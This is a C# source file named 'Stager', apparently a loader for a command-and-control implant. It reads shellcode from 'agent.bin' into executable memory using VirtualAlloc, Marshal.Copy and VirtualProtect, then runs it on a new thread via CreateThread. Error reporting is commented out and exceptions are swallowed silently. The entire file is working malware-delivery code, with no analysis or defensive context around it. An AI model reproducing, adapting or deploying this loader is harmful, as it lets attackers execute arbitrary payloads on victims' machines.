using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Stager
{
    public class Program
    {
        static void Main(string[] args)
        {
            byte[] shellcode;
            using (var stream = File.OpenRead("agent.bin"))
            {
                shellcode = new byte[stream.Length];
                stream.Read(shellcode, 0, shellcode.Length);
            }

            ExecSelf(shellcode);
        }

        public static void ExecSelf(byte[] shellcode)
        {


            var baseAddress = Native.Kernel32.VirtualAlloc(
                    IntPtr.Zero,
                    shellcode.Length,
                    Native.Kernel32.AllocationType.Commit |  Native.Kernel32.AllocationType.Reserve,
                    Native.Kernel32.MemoryProtection.ExecuteReadWrite);

            if (baseAddress == IntPtr.Zero)
            {
                //Console.WriteLine($"Failed to allocate memory for Loader.dll, error code: {Marshal.GetLastWin32Error()}");
                return;
            }

            try
            {
                Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

                if (!Native.Kernel32.VirtualProtect(
                    baseAddress,
                    shellcode.Length,
                    Native.Kernel32.MemoryProtection.ExecuteRead,
                    out _))
                {
                    throw new InvalidOperationException();//$"Failed to change memory to execute, error code: {Marshal.GetLastWin32Error()}");
                }

                uint threadId = 0;
                IntPtr pinfo = IntPtr.Zero;
                IntPtr hThread = Native.Kernel32.CreateThread(
                    0,
                  0,
                  baseAddress,
                  pinfo,
                  0,
                  ref threadId);

                if (hThread == IntPtr.Zero)
                {
                    throw new InvalidOperationException();//;$"Failed to create  thread to start execution of the shellcode, error code: {Marshal.GetLastWin32Error()}");
                }

                Native.Kernel32.WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
            catch (InvalidOperationException e)
            {
                //Console.WriteLine(e.Message);
            }
            finally
            {
                Native.Kernel32.VirtualFreeEx(Process.GetCurrentProcess().Handle, baseAddress, 0, Native.Kernel32.FreeType.Release);
            }

        }
    }
}
